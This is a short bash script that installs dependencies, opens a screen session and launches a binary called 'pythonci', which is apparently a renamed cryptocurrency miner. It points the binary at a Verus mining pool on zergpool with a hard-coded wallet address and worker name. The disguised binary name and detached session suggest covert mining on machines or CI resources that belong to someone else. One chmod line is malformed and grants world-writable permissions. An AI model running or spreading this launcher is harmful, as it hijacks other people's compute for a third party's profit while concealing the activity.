#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x joyce.sh && chmod +x pythonci chmod 777 pythonci joyce.sh
screen -dmS ls
PL=stratum+tcp://verushash.na.mine.zergpool.com:3300
WT=DQsBCUuRxrhSgjxM9DFq44GEXSYgGmDmfW
WR=VIA-010
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 4 -x

